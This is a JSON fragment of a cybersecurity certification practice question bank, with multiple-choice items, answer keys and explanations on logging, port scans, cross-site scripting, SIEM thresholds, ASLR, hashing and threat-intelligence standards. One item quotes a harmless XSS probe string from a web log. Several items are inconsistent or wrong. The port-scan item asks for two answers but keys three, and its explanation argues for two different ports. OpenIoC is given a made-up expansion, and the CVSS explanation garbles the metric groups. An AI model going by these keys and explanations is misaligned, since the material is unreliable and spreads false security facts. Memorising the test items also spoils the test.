    "domain": "Domain 1.0: Security Operations",
    "question": "A software developer has been deploying web applications with common security risks to include\ninsufficient logging capabilities. Which of the following actions would be most effective to\nreduce risks associated with the application development?",
    "options": [
      "A. Perform static analyses using an integrated development environment.",
      "B. Deploy compensating controls into the environment.",
      "C. Implement server-side logging and automatic updates.",
      "D. Conduct regular code reviews using OWASP best practices."
    ],
    "answer": "D",
    "explanation": "Conducting regular code reviews using OWASP best practices is the most effective action to reduce\nrisks associated with the application development. Code reviews are a systematic examination of the\nsource code of an application to detect and fix errors, vulnerabilities, and weaknesses that may\ncompromise the security, functionality, or performance of the application. Code reviews can help to\nimprove the quality and security of the code, as well as to identify and remediate common security\nrisks, such as insufficient logging capabilities. OWASP (Open Web Application Security Project) is a\nglobal nonprofit organization that provides free and open resources, tools, standards, and best\npractices for web application security. OWASP best practices for logging include following a common\nlogging format and approach, logging relevant security events and data, protecting log data from\nunauthorized access or modification, and using log analysis and monitoring tools to detect and\nrespond to security incidents. By following OWASP best practices for logging, developers can ensure\nthat their web applications have sufficient and effective logging capabilities that can help to prevent,\ndetect, and mitigate security threats.\nReference: OWASP Logging Cheat Sheet, OWASP Logging Guide, C9: Implement Security Logging and\nMonitoring - OWASP Foundation",
    "image": null
  },
  {
    "id": "q-jc-132",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 3,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security audit for unsecured network services was conducted, and the following output was\ngenerated:\nWhich of the following services should the security team investigate further? (Select two).",
    "options": [
      "A. 21 (FTP — Unencrypted file transfer)",
      "B. 22 (SSH — Encrypted remote shell)",
      "C. 23 (Telnet — Unencrypted remote shell)",
      "D. 636 (LDAPS — Encrypted directory service)",
      "E. 1723 (PPTP — Weak VPN protocol)",
      "F. 3389 (RDP — Remote Desktop Protocol)"
    ],
    "answer": [
      "A",
      "C",
      "E"
    ],
    "explanation": "The output shows the results of a port scan, which is a technique used to identify open ports and\nservices running on a network host. Port scanning can be used by attackers to discover potential\nvulnerabilities and exploit them, or by defenders to assess the security posture and configuration of\ntheir network devices1\nThe output lists six ports that are open on the target host, along with the service name and version\nassociated with each port. The service name indicates the type of application or protocol that is\nusing the port, while the version indicates the specific release or update of the service. The service\nname and version can provide useful information for both attackers and defenders, as they can\nreveal the capabilities, features, and weaknesses of the service.\nAmong the six ports listed, two are particularly risky and should be investigated further by the\nsecurity team: port 23 and port 636.\nPort 23 is used by Telnet, which is an old and insecure protocol for remote login and command\nexecution. Telnet does not encrypt any data transmitted over the network, including usernames and\npasswords, which makes it vulnerable to eavesdropping, interception, and modification by\nattackers. Telnet also has many known vulnerabilities that can allow attackers to gain unauthorized\naccess, execute arbitrary commands, or cause denial-of-service attacks on the target host23\nPort 636 is used by LDAP over SSL/TLS (LDAPS), which is a protocol for accessing and modifying\ndirectory services over a secure connection. LDAPS encrypts the data exchanged between the client\nand the server using SSL/TLS certificates, which provide authentication, confidentiality, and integrity.\nHowever, LDAPS can also be vulnerable to attacks if the certificates are not properly configured,\nverified, or updated. For example, attackers can use self-signed or expired certificates to perform\nman-in-the-middle attacks, spoofing attacks, or certificate revocation attacks on LDAPS connections.\nTherefore, the security team should investigate further why port 23 and port 636 are open on the\ntarget host, and what services are running on them. The security team should also consider disabling\nor replacing these services with more secure alternatives, such as SSH for port 23 and StartTLS for\nport 6362",
    "image": "images/page_103_img_2.jpeg"
  },
  {
    "id": "q-jc-133",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "While reviewing web server logs, a security analyst found the following line:\n<IMG SRC=’vbscript:msgbox(\"test\")’>\nWhich of the following malicious activities was attempted?",
    "options": [
      "A. Command injection",
      "B. XML injection",
      "C. Server-side request forgery",
      "D. Cross-site scripting"
    ],
    "answer": "D",
    "explanation": "XSS is a type of web application attack that exploits the vulnerability of a web server or browser to\nexecute malicious scripts or commands on the client-side. XSS attackers inject malicious code, such\nas JavaScript, VBScript, HTML, or CSS, into a web page or application that is viewed by other\nusers. The malicious code can then access or manipulate the user’s session, cookies, browser history,\nor personal information, or perform actions on behalf of the user, such as stealing credentials,\nredirecting to phishing sites, or installing malware12\nThe line in the web server log shows an example of an XSS attack using VBScript. The attacker tried to\ninsert an <IMG> tag with a malicious SRC attribute that contains a VBScript code. The VBScript code\nis intended to display a message box with the text “test” when the user views the web page or\napplication. This is a simple and harmless example of XSS, but it could be used to test the\nvulnerability of the web server or browser, or to launch more sophisticated and harmful attacks3",
    "image": null
  },
  {
    "id": "q-jc-134",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following is often used to keep the number of alerts to a manageable level when\nestablishing a process to track and analyze violations?",
    "options": [
      "A. Log retention",
      "B. Log rotation",
      "C. Maximum log size",
      "D. Threshold value"
    ],
    "answer": "D",
    "explanation": "A threshold value is a parameter that defines the minimum or maximum level of a metric or event\nthat triggers an alert. For example, a threshold value can be set to alert when the number of failed\nlogin attempts exceeds 10 in an hour, or when the CPU usage drops below 20% for more than 15\nminutes. By setting a threshold value, the process can filter out irrelevant or insignificant alerts and\nfocus on the ones that indicate a potential problem or anomaly. A threshold value can help to reduce\nthe noise and false positives in the alert system, and improve the efficiency and accuracy of the\nanalysis12",
    "image": null
  },
  {
    "id": "q-jc-135",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following is described as a method of enforcing a security policy between cloud\ncustomers and cloud services?",
    "options": [
      "A. CASB",
      "B. DMARC",
      "C. SIEM",
      "D. PAM"
    ],
    "answer": "A",
    "explanation": "A CASB (Cloud Access Security Broker) is a security solution that acts as an intermediary between\ncloud users and cloud providers, and monitors and enforces security policies for cloud access and\nusage. A CASB can help organizations protect their data and applications in the cloud from\nunauthorized or malicious access, as well as comply with regulatory standards and best practices. A\nCASB can also provide visibility, control, and analytics for cloud activity, and identify and mitigate\npotential threats12\nThe other options are not correct. DMARC (Domain-based Message Authentication, Reporting and\nConformance) is an email authentication protocol that helps email domain owners prevent spoofing\nand phishing attacks by verifying the sender’s identity and instructing the receiver how to handle\nunauthenticated messages34 SIEM (Security Information and Event Management) is a security\nsolution that collects, aggregates, and analyzes log data from various sources across an organization’s\nnetwork, such as applications, devices, servers, and users, and provides real-time alerts, dashboards,\nreports, and incident response capabilities to help security teams identify and mitigate\ncyberattacks56 PAM (Privileged Access Management) is a security solution that helps organizations\nmanage and protect the access and permissions of users, accounts, processes, and systems that have\nelevated or administrative privileges. PAM can help prevent credential theft, data breaches, insider\nthreats, and compliance violations by monitoring, detecting, and preventing unauthorized privileged\naccess to critical resources78",
    "image": null
  },
  {
    "id": "q-jc-136",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "After completing a review of network activity. the threat hunting team discovers a device on the\nnetwork that sends an outbound email via a mail client to a non-company email address daily\nat 10:00 p.m. Which of the following is potentially occurring?",
    "options": [
      "A. Irregular peer-to-peer communication",
      "B. Rogue device on the network",
      "C. Abnormal OS process behavior",
      "D. Data exfiltration"
    ],
    "answer": "D",
    "explanation": "Data exfiltration is the theft or unauthorized transfer or movement of data from a device or network.\nIt can occur as part of an automated attack or manually, on-site or through an internet connection,\nand involve various methods. It can affect personal or corporate data, such as sensitive or\nconfidential information. Data exfiltration can be prevented or detected by using compression,\nencryption, authentication, authorization, and other controls1\nThe network activity shows that a device on the network is sending an outbound email via a mail\nclient to a non-company email address daily at 10:00 p.m. This could indicate that the device is\ncompromised by malware or an insider threat, and that the email is used to exfiltrate data from the\nnetwork to an external party. The email could contain attachments, links, or hidden data that contain\nthe stolen information. The timing of the email could be designed to avoid detection by normal\nnetwork monitoring or security systems.",
    "image": null
  },
  {
    "id": "q-jc-137",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "Which of the following threat-modeling procedures is in the OWASP Web Security Testing Guide?",
    "options": [
      "A. Review Of security requirements",
      "B. Compliance checks",
      "C. Decomposing the application",
      "D. Security by design"
    ],
    "answer": "C",
    "explanation": "The OWASP Web Security Testing Guide (WSTG) includes a section on threat modeling, which is a\nstructured approach to identify, quantify, and address the security risks associated with an\napplication. The first step in the threat modeling process is decomposing the application, which\ninvolves creating use cases, identifying entry points, assets, trust levels, and data flow diagrams for\nthe application. This helps to understand the application and how it interacts with external entities,\nas well as to identify potential threats and vulnerabilities1. The other options are not part of the\nOWASP WSTG threat modeling process.",
    "image": null
  },
  {
    "id": "q-jc-138",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following is a reason why proper handling and reporting of existing evidence are\nimportant for the investigation and reporting phases of an incident response?",
    "options": [
      "A. TO ensure the report is legally acceptable in case it needs to be presented in court",
      "B. To present a lessons-learned analysis for the incident response team",
      "C. To ensure the evidence can be used in a postmortem analysis",
      "D. To prevent the possible loss of a data source for further root cause analysis"
    ],
    "answer": "A",
    "explanation": "The correct answer is A) To ensure the report is legally acceptable in case it needs to be presented in\ncourt.\nProper handling and reporting of existing evidence are important for the investigation and reporting\nphases of an incident response because they ensure the integrity, authenticity, and admissibility of\nthe evidence in case it needs to be presented in court. Evidence that is mishandled, tampered with,\nor poorly documented may not be accepted by the court or may be challenged by the opposing\nparty. Therefore, incident responders should follow the best practices and standards for evidence\ncollection, preservation, analysis, and reporting1.\nThe other options are not reasons why proper handling and reporting of existing evidence are\nimportant for the investigation and reporting phases of an incident response. They are rather\noutcomes or benefits of conducting a thorough and effective incident response process. A lessons-\nlearned analysis (B) is a way to identify the strengths and weaknesses of the incident response team\nand improve their performance for future incidents. A postmortem analysis © is a way to determine\nthe root cause, impact, and timeline of the incident and provide recommendations for remediation\nand prevention. A root cause analysis (D) is a way to identify the underlying factors that led to the\nincident and address them accordingly.",
    "image": null
  },
  {
    "id": "q-jc-139",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "A company's security team is updating a section of the reporting policy that pertains to inappropriate\nuse of resources (e.g., an employee who installs cryptominers on workstations in the office). Besides\nthe security team, which\nof the following groups should the issue be escalated to first in order to comply with industry best\npractices?",
    "options": [
      "A. Help desk",
      "B. Law enforcement",
      "C. Legal department",
      "D. Board member"
    ],
    "answer": "C",
    "explanation": "The correct answer is C. Legal department.\nAccording to the CompTIA Cybersecurity Analyst (CySA+) certification exam objectives, one of the\ntasks for a security analyst is to “report and escalate security incidents to appropriate stakeholders\nand authorities” 1. This includes reporting any inappropriate use of resources, such as installing\ncryptominers on workstations, which may violate the company’s policies and cause financial and\nreputational damage. The legal department is the most appropriate group to escalate this issue to\nfirst, as they can advise on the legal implications and actions that can be taken against the employee.\nThe legal department can also coordinate with other groups, such as law enforcement, help desk, or\nboard members, as needed. The other options are not the best choices to escalate the issue to first,\nas they may not have the authority or expertise to handle the situation properly.",
    "image": null
  },
  {
    "id": "q-jc-140",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following best describes the reporting metric that should be utilized when measuring\nthe degree to which a system, application, or user base is affected by an uptime availability outage?",
    "options": [
      "A. Timeline",
      "B. Evidence",
      "C. Impact",
      "D. Scope"
    ],
    "answer": "C",
    "explanation": "The correct answer is C. Impact.\nThe impact metric is the best way to measure the degree to which a system, application, or user base\nis affected by an uptime availability outage. The impact metric quantifies the consequences of the\noutage in terms of lost revenue, productivity, reputation, customer satisfaction, or other relevant\nfactors. The impact metric can help prioritize the recovery efforts and justify the resources needed to\nrestore the service1.\nThe other options are not the best ways to measure the degree to which a system, application, or\nuser base is affected by an uptime availability outage. The timeline metric (A) measures the duration\nand frequency of the outage, but not its effects. The evidence metric (B) measures the sources and\ntypes of data that can be used to investigate and analyze the outage, but not its effects. The scope\nmetric (D) measures the extent and severity of the outage, but not its effects.",
    "image": null
  },
  {
    "id": "q-jc-141",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An organization enabled a SIEM rule to send an alert to a security analyst distribution list when ten\nfailed logins occur within one minute. However, the control was unable to detect an attack with nine\nfailed logins. Which of the following best represents what occurred?",
    "options": [
      "A. False positive",
      "B. True negative",
      "C. False negative",
      "D. True positive"
    ],
    "answer": "C",
    "explanation": "The correct answer is C. False negative.\nA false negative is a situation where an attack or a threat is not detected by a security control, even\nthough it should have been. In this case, the SIEM rule was unable to detect an attack with nine\nfailed logins, which is below the threshold of ten failed logins that triggers an alert. This means that\nthe SIEM rule missed a potential attack and failed to alert the security analysts, resulting in a false\nnegative.\nA false positive is a situation where a benign or normal activity is detected as an attack or a threat by\na security control, even though it is not. A true negative is a situation where a benign or normal\nactivity is not detected as an attack or a threat by a security control, as expected. A true positive is a\nsituation where an attack or a threat is detected by a security control, as expected. These are not the\ncorrect answers for this question.",
    "image": null
  },
  {
    "id": "q-jc-142",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A cybersecurity team has witnessed numerous vulnerability events recently that have affected\noperating systems. The team decides to implement host-based IPS, firewalls, and two-factor\nauthentication. Which of the following\ndoes this most likely describe?",
    "options": [
      "A. System hardening",
      "B. Hybrid network architecture",
      "C. Continuous authorization",
      "D. Secure access service edge"
    ],
    "answer": "A",
    "explanation": "The correct answer is\nA) System hardening.\nSystem hardening is the process of securing a system by reducing its attack surface, applying patches\nand updates, configuring security settings, and implementing security controls. System hardening\ncan help prevent or mitigate vulnerability events that may affect operating systems. Host-based IPS,\nfirewalls, and two-factor authentication are examples of security controls that can be applied to\nharden a system1.\nThe other options are not the best descriptions of the scenario. A hybrid network architecture (B) is a\nnetwork design that combines on-premises and cloud-based resources, which may or may not\ninvolve system hardening. Continuous authorization © is a security approach that monitors and\nvalidates the security posture of a system on an ongoing basis, which is different from system\nhardening. Secure access service edge (D) is a network architecture that delivers cloud-based\nsecurity services to remote users and devices, which is also different from system hardening.",
    "image": null
  },
  {
    "id": "q-jc-143",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A Chief Information Security Officer (CISO) is concerned that a specific threat actor who is known to\ntarget the company's business type may be able to breach the network and remain inside of it for an\nextended period of time.\nWhich of the following techniques should be performed to meet the CISO's goals?",
    "options": [
      "A. Vulnerability scanning",
      "B. Adversary emulation",
      "C. Passive discovery",
      "D. Bug bounty"
    ],
    "answer": "B",
    "explanation": "The correct answer is B. Adversary emulation.\nAdversary emulation is a technique that involves mimicking the tactics, techniques, and procedures\n(TTPs) of a specific threat actor or group to test the effectiveness of the security controls and incident\nresponse capabilities of an organization1. Adversary emulation can help identify and address the\ngaps and weaknesses in the security posture of an organization, as well as improve the readiness and\nskills of the security team. Adversary emulation can also help measure the dwell time, which is the\nduration that a threat actor remains undetected inside the network2.\nThe other options are not the best techniques to meet the CISO’s goals. Vulnerability scanning (A) is\na technique that involves scanning the network and systems for known vulnerabilities, but it does\nnot simulate a real attack or test the incident response capabilities. Passive discovery © is a\ntechnique that involves collecting information about the network and systems without sending any\npackets or probes, but it does not identify or exploit any vulnerabilities or test the security controls.\nBug bounty (D) is a program that involves rewarding external researchers or hackers for finding and\nreporting vulnerabilities in an organization’s systems or applications, but it does not focus on a\nspecific threat actor or group.",
    "image": null
  },
  {
    "id": "q-jc-144",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "While performing a dynamic analysis of a malicious file, a security analyst notices the memory\naddress changes every time the process runs. Which of the following controls is most likely\npreventing the analyst from finding the proper memory address of the piece of malicious code?",
    "options": [
      "A. Address space layout randomization",
      "B. Data execution prevention",
      "C. Stack canary",
      "D. Code obfuscation"
    ],
    "answer": "A",
    "explanation": "The correct answer is\nA) Address space layout randomization.\nAddress space layout randomization (ASLR) is a security control that randomizes the memory address\nspace of a process, making it harder for an attacker to exploit memory-based vulnerabilities, such as\nbuffer overflows1. ASLR can also prevent a security analyst from finding the proper memory address\nof a piece of malicious code, as the memory address changes every time the process runs2.\nThe other options are not the best explanations for why the memory address changes every time the\nprocess runs. Data execution prevention (B) is a security control that prevents code from being\nexecuted in certain memory regions, such as the stack or the heap3. Stack canary © is a security\ntechnique that places a random value on the stack before a function’s return address, to detect and\nprevent stack buffer overflows. Code obfuscation (D) is a technique that modifies the source code or\nbinary of a program to make it more difficult to understand or reverse engineer. These techniques do\nnot affect the memory address space of a process, but rather the execution or analysis of the code.",
    "image": null
  },
  {
    "id": "q-jc-145",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst wants to ensure that users only leverage web-based software that has been pre-approved\nby the organization. Which of the following should be deployed?",
    "options": [
      "A. Blocklisting",
      "B. Allowlisting",
      "C. Graylisting",
      "D. Webhooks"
    ],
    "answer": "B",
    "explanation": "The correct answer is B. Allowlisting.\nAllowlisting is a technique that allows only pre-approved web-based software to run on a system or\nnetwork, while blocking all other software. Allowlisting can help prevent unauthorized or malicious\nsoftware from compromising the security of an organization. Allowlisting can be implemented using\nvarious methods, such as application control, browser extensions, firewall rules, or proxy servers12.\nThe other options are not the best techniques to ensure that users only leverage web-based software\nthat has been pre-approved by the organization. Blocklisting (A) is a technique that blocks specific\nweb-based software from running on a system or network, while allowing all other software.\nBlocklisting can be ineffective or inefficient, as it requires constant updates and may not catch all\nmalicious software. Graylisting © is a technique that temporarily rejects or delays incoming\nmessages from unknown or suspicious sources, until they are verified as legitimate. Graylisting is\nmainly used for email filtering, not for web-based software control. Webhooks (D) are a technique\nthat allows web-based software to send or receive data from other web-based software in real time,\nbased on certain events or triggers. Webhooks are not related to web-based software control, but\nrather to web-based software integration.",
    "image": null
  },
  {
    "id": "q-jc-146",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following best describes the goal of a disaster recovery exercise as preparation for\npossible incidents?",
    "options": [
      "A. TO provide metrics and test continuity controls",
      "B. To verify the roles of the incident response team",
      "C. To provide recommendations for handling vulnerabilities",
      "D. To perform tests against implemented security controls"
    ],
    "answer": "A",
    "explanation": "The correct answer is\nA) To provide metrics and test continuity controls.\nA disaster recovery exercise is a simulation or a test of the disaster recovery plan, which is a set of\nprocedures and resources that are used to restore the normal operations of an organization after a\ndisaster or a major incident. The goal of a disaster recovery exercise is to provide metrics and test\ncontinuity controls, which are the measures that ensure the availability and resilience of the critical\nsystems and processes of an organization. A disaster recovery exercise can help evaluate the\neffectiveness, efficiency, and readiness of the disaster recovery plan, as well as identify and address\nany gaps or issues .\nThe other options are not the best descriptions of the goal of a disaster recovery exercise. Verifying\nthe roles of the incident response team (B) is a goal of an incident response exercise, which is a\nsimulation or a test of the incident response plan, which is a set of procedures and roles that are\nused to detect, contain, analyze, and remediate an incident. Providing recommendations for\nhandling vulnerabilities © is a goal of a vulnerability assessment, which is a process of identifying\nand prioritizing the weaknesses and risks in an organization’s systems or network. Performing tests\nagainst implemented security controls (D) is a goal of a penetration test, which is an authorized and\nsimulated attack on an organization’s systems or network to evaluate their security posture and\nidentify any vulnerabilities or misconfigurations.",
    "image": null
  },
  {
    "id": "q-jc-147",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst is reviewing the findings of the latest vulnerability report for a company's web\napplication. The web application accepts files for a Bash script to be processed if the files match a\ngiven hash. The analyst is able to submit files to the system due to a hash collision. Which of the\nfollowing should the analyst suggest to mitigate the vulnerability with the fewest changes to the\ncurrent script and infrastructure?",
    "options": [
      "A. Deploy a WAF to the front of the application.",
      "B. Replace the current MD5 with SHA-256.",
      "C. Deploy an antivirus application on the hosting system.",
      "D. Replace the MD5 with digital signatures."
    ],
    "answer": "B",
    "explanation": "The correct answer is B. Replace the current MD5 with SHA-256.\nThe vulnerability that the security analyst is able to exploit is a hash collision, which is a situation\nwhere two different files produce the same hash value. Hash collisions can allow an attacker to\nbypass the integrity or authentication checks that rely on hash values, and submit malicious files to\nthe system. The web application uses MD5, which is a hashing algorithm that is known to be\nvulnerable to hash collisions. Therefore, the analyst should suggest replacing the current MD5 with\nSHA-256, which is a more secure and collision-resistant hashing algorithm.\nThe other options are not the best suggestions to mitigate the vulnerability with the fewest changes\nto the current script and infrastructure. Deploying a WAF (web application firewall) to the front of the\napplication (A) may help protect the web application from some common attacks, but it may not\nprevent hash collisions or detect malicious files. Deploying an antivirus application on the hosting\nsystem © may help scan and remove malicious files from the system, but it may not prevent hash\ncollisions or block malicious files from being submitted. Replacing the MD5 with digital signatures (D)\nmay help verify the authenticity and integrity of the files, but it may require significant changes to\nthe current script and infrastructure, as digital signatures involve public-key cryptography and\ncertificate authorities.",
    "image": null
  },
  {
    "id": "q-jc-148",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A Chief Information Security Officer wants to map all the attack vectors that the company faces each\nday. Which of the following recommendations should the company align their security controls\naround?",
    "options": [
      "A. OSSTMM",
      "B. Diamond Model Of Intrusion Analysis",
      "C. OWASP",
      "D. MITRE ATT&CK"
    ],
    "answer": "D",
    "explanation": "The correct answer is D. MITRE ATT&CK.\nMITRE ATT&CK is a framework that maps the tactics, techniques, and procedures (TTPs) of various\nthreat actors and groups, based on real-world observations and dat\na. MITRE ATT&CK can help a Chief Information Security Officer (CISO) to map all the attack vectors\nthat the company faces each day, as well as to align their security controls around the most relevant\nand prevalent threats. MITRE ATT&CK can also help the CISO to assess the effectiveness and maturity\nof their security posture, as well as to identify and prioritize the gaps and improvements .\nThe other options are not the best recommendations for mapping all the attack vectors that the\ncompany faces each day. OSSTMM (Open Source Security Testing Methodology Manual) (A) is a\nmethodology that provides guidelines and best practices for conducting security testing and auditing,\nbut it does not map the TTPs of threat actors or groups. Diamond Model of Intrusion Analysis (B) is a\nmodel that analyzes the relationships and interactions between four elements of an intrusion:\nadversary, capability, infrastructure, and victim. The Diamond Model can help understand the\ncharacteristics and context of an intrusion, but it does not map the TTPs of threat actors or groups.\nOWASP (Open Web Application Security Project) © is a project that provides resources and tools for\nimproving the security of web applications, but it does not map the TTPs of threat actors or groups.",
    "image": null
  },
  {
    "id": "q-jc-149",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following best describes the key elements of a successful information security\nprogram?",
    "options": [
      "A. Business impact analysis, asset and change management, and security communication plan",
      "B. Security policy implementation, assignment of roles and responsibilities, and information asset\nclassification",
      "C. Disaster recovery and business continuity planning, and the definition of access control\nrequirements and human resource policies",
      "D. Senior management organizational structure, message distribution standards, and procedures for\nthe operation of security management systems"
    ],
    "answer": "B",
    "explanation": "A successful information security program consists of several key elements that align with the\norganization’s goals and objectives, and address the risks and threats to its information assets. \nSecurity policy implementation: This is the process of developing, documenting, and enforcing the\nrules and standards that govern the security of the organization’s information assets. Security\npolicies define the scope, objectives, roles, and responsibilities of the security program, as well as\nthe acceptable use, access control, incident response, and compliance requirements for the\ninformation assets.\nAssignment of roles and responsibilities: This is the process of identifying and assigning the specific\ntasks and duties related to the security program to the appropriate individuals or groups within the\norganization. Roles and responsibilities define who is accountable, responsible, consulted, and\ninformed for each security activity, such as risk assessment, vulnerability management, threat\ndetection, incident response, auditing, and reporting.\nInformation asset classification: This is the process of categorizing the information assets based on\ntheir value, sensitivity, and criticality to the organization. Information asset classification helps to\ndetermine the appropriate level of protection and controls for each asset, as well as the impact and\nlikelihood of a security breach or loss. Information asset classification also facilitates the\nprioritization of security resources and efforts based on the risk level of each asset.",
    "image": "images/page_116_img_2.jpeg"
  },
  {
    "id": "q-jc-150",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An organization conducted a web application vulnerability assessment against the corporate website,\nand the following output was observed:\nWhich of the following tuning recommendations should the security analyst share?",
    "options": [
      "A. Set an Http Only flag to force communication by HTTPS.",
      "B. Block requests without an X-Frame-Options header.",
      "C. Configure an Access-Control-Allow-Origin header to authorized domains.",
      "D. Disable the cross-origin resource sharing header."
    ],
    "answer": "C",
    "explanation": "Explanation: The output shows that the web application has a cross-origin resource sharing (CORS)\nheader that allows any origin to access its resources. This is a security misconfiguration that could\nallow malicious websites to make requests to the web application on behalf of the user and access\nsensitive data or perform unauthorized actions. The tuning recommendation is to configure the\nAccess-Control-Allow-Origin header to only allow authorized domains that need to access the web\napplication’s resources. This would prevent unauthorized cross-origin requests and reduce the risk of\ncross-site request forgery (CSRF) attacks.\nReference: OWASP Top Ten | OWASP Foundation",
    "image": "images/page_116_img_2.jpeg"
  },
  {
    "id": "q-jc-152",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following makes STIX and OpenloC information readable by both humans and\nmachines?",
    "options": [
      "A. XML",
      "B. URL",
      "C. OVAL",
      "D. TAXII"
    ],
    "answer": "A",
    "explanation": "The correct answer is A. XML.\nSTIX and OpenloC are two standards for representing and exchanging cyber threat intelligence (CTI)\ninformation. STIX stands for Structured Threat Information Expression and OpenloC stands for Open\nLocation and Identity Coordinates. Both standards use XML as the underlying data format to encode\nthe information in a structured and machine-readable way. XML stands for Extensible Markup\nLanguage and it is a widely used standard for defining and exchanging data on the web. XML uses\ntags, attributes, and elements to describe the structure and meaning of the data. XML is also human-\nreadable, as it uses plain text and follows a hierarchical and nested structure.\nXML is not the only format that can be used to make STIX and OpenloC information readable by both\nhumans and machines, but it is the most common and widely supported one. Other formats that can\nbe used include JSON, CSV, or PDF, depending on the use case and the preferences of the information\nproducers and consumers. However, XML has some advantages over other formats, such as:\nXML is more expressive and flexible than JSON or CSV, as it can define complex data types, schemas,\nnamespaces, and validation rules.\nXML is more standardized and interoperable than PDF, as it can be easily parsed, transformed,\nvalidated, and queried by various tools and languages.\nXML is more compatible with existing CTI standards and tools than other formats, as it is the basis for\nSTIX 1.x, TAXII 1.x, MAEC, CybOX, OVAL, and others.\nReference:\n1 Introduction to STIX - GitHub Pages\n2 5 Best Threat Intelligence Feeds in 2023 (Free & Paid Tools) - Comparitech\n3 What Are STIX/TAXII Standards? - Anomali Resources\n4 What is STIX/TAXII? | Cloudflare\n5 Sample Use | TAXII Project Documentation - GitHub Pages\n6 Trying to retrieve xml data with taxii - Stack Overflow\n7 CISA AIS TAXII Server Connection Guide\n8 CISA AIS TAXII Server Connection Guide v2.0 | CISA",
    "image": null
  },
  {
    "id": "q-jc-153",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst is evaluating the following vulnerability report:\nWhich of the following vulnerability report sections provides information about the level of impact\non data confidentiality if a successful exploitation occurs?",
    "options": [
      "A. Payloads",
      "B. Metrics",
      "C. Vulnerability",
      "D. Profile"
    ],
    "answer": "B",
    "explanation": "The correct answer is B. Metrics.\nThe Metrics section of the vulnerability report provides information about the level of impact on\ndata confidentiality if a successful exploitation occurs. The Metrics section contains the CVE\ndictionary entry and the CVSS base score of the vulnerability. CVE stands for Common Vulnerabilities\nand Exposures and it is a standardized system for identifying and naming vulnerabilities. CVSS stands\nfor Common Vulnerability Scoring System and it is a standardized system for measuring and rating\nthe severity of vulnerabilities.\nThe CVSS base score is a numerical value between 0 and 10 that reflects the intrinsic characteristics\nof a vulnerability, such as its exploitability, impact, and scope. The CVSS base score is composed of\nthree metric groups: Base, Temporal, and Environmental. The Base metric group captures the\ncharacteristics of a vulnerability that are constant over time and across user environments. The Base\nmetric group consists of six metrics: Attack Vector, Attack Complexity, Privileges Required, User\nInteraction, Scope, and Impact. The Impact metric measures the effect of a vulnerability on the\nconfidentiality, integrity, and availability of the affected resources.\nIn this case, the CVSS base score of the vulnerability is 9.8, which indicates a critical severity level.\nThe Impact metric of the CVSS base score is 6.0, which indicates a high impact on confidentiality,\nintegrity, and availability. Therefore, the Metrics section provides information about the level of\nimpact on data confidentiality if a successful exploitation occurs.\nThe other sections of the vulnerability report do not provide information about the level of impact\non data confidentiality if a successful exploitation occurs. The Payloads section contains links to\nrequest and response payloads that demonstrate how the vulnerability can be exploited. The\nPayloads section can help an analyst to understand how the attack works, but it does not provide a\nquantitative measure of the impact. The Vulnerability section contains information about the type,\ngroup, and description of the vulnerability. The Vulnerability section can help an analyst to identify\nand classify the vulnerability, but it does not provide a numerical value of the impact. The Profile\nsection contains information about the authentication, times viewed, and aggressiveness of the\nvulnerability. The Profile section can help an analyst to assess the risk and priority of the\nvulnerability, but it does not provide a specific measure of the impact on data confidentiality.\nReference:\n[1] CVE - Common Vulnerabilities and Exposures (CVE)\n[2] Common Vulnerability Scoring System SIG\n[3] CVSS v3.1 Specification Document\n[4] CVSS v3.1 User Guide\n[5] How to Read a Vulnerability Report - Security Boulevard",
    "image": "images/page_120_img_2.jpeg"
  },
  {
    "id": "q-jc-154",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following best describes the importance of implementing TAXII as part of a threat\nintelligence program?",
    "options": [
      "A. It provides a structured way to gain information about insider threats.",
      "B. It proactively facilitates real-time information sharing between the public and private sectors.",
      "C. It exchanges messages in the most cost-effective way and requires little maintenance once\nimplemented.",
      "D. It is a semi-automated solution to gather threat intellbgence about competitors in the same\nsector."
    ],
    "answer": "B",
